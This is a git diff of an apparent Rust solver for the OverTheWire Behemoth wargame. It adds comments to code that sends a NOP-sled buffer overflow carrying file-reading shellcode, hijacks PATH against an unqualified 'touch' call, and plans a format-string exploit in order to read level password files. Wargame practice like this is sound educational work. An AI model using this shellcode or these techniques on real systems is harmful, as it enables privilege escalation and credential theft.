@@ -120,10 +120,10 @@ fn behemoth1(password: &str) -> Result<String> {
     read_until(&mut channel, "behemoth1@gibson:~$ ")?;
 
     let nop_sled: Vec<u8> = vec![0x90; 69]; // the offset is 71 to the ret address. 71 - length of jmp is 69 (nice)
-    let jmp_esp = hex::decode("eb04").unwrap(); // jmp 6 (4 + length of instruction, eb 04)
+    let jmp_esp = hex::decode("eb04").unwrap(); // jmp 6 (4 + length of instruction, eb 04), used to jump over the next four bytes below
     let var_adr = hex::decode("01d5ffff").unwrap(); // 0xffffd501, approximate location in nop sled
     let file_read_shellcode = hex::decode("31C031DB31C931D2EB325BB00531C9CD8089C6EB06B00131DBCD8089F3B00383EC018D0C24B201CD8031DB39C374E6B004B301B201CD8083C401EBDFE8C9FFFFFF").unwrap(); // https://shell-storm.org/shellcode/files/shellcode-73.html
-    let file_to_read = "/etc/behemoth_pass/behemoth2".as_bytes();
+    let file_to_read = "/etc/behemoth_pass/behemoth2".as_bytes(); // shell code above uses sys_open/sys_read/sys_write to print the contents of the filepath following it, specified here
 
     let mut full_payload: Vec<u8> = Vec::new();
     full_payload.extend(nop_sled);
@@ -154,7 +154,7 @@ fn behemoth1(password: &str) -> Result<String> {
 }
 
 fn behemoth2(password: &str) -> Result<String> {
-    // behemoth2 calls touch unqualified to create a file with the name of its PID. it then waits two seconds before executing the file's contents
+    // behemoth2 calls 'touch' unqualified to create a file with the name of its PID. it then waits two seconds before executing the file's contents
     // while this could be exploited by perhaps writing some command into the file (once the pid is determined), it is simpler to hijack touch via path injection
 
     let session = ssh_session("behemoth2", password)?;
@@ -174,7 +174,7 @@ fn behemoth2(password: &str) -> Result<String> {
     read_until(&mut channel, "$ ")?;
 
     println!("reading password");
-    write_line(&mut channel, "/bin/cat /etc/behemoth_pass/behemoth3")?;
+    write_line(&mut channel, "/bin/cat /etc/behemoth_pass/behemoth3")?; // note because we murdered PATH, we need to use the qualified path to 'cat' to call it
     let result = read_until(&mut channel, "$ ")?;
     let result: Vec<&str> = result.split("\n").collect();
     let result = result[result.len()-2].trim();
@@ -185,6 +185,18 @@ fn behemoth2(password: &str) -> Result<String> {
 }
 
 fn behemoth3(password: &str) -> Result<String> {
+    // behemoth3 is a fairly simple format string exploit, calling gets on a 200 len buffer and then printing the result:
+    // main() {
+    //     char local_cc [200];
+    //     printf("Identify yourself: ");
+    //     fgets(local_cc,200,stdin);
+    //     printf("Welcome, ");
+    //     printf(local_cc);
+    //     puts("\naaaand goodbye again.");
+    //     return 0;
+    // }
+    // stack isn't executable. best approach is to use the format string bug to overwrite an address in the GLT or the return address
+    // to point at shellcode in a env var or similar.
 
     let session = ssh_session("behemoth3", password)?;
 
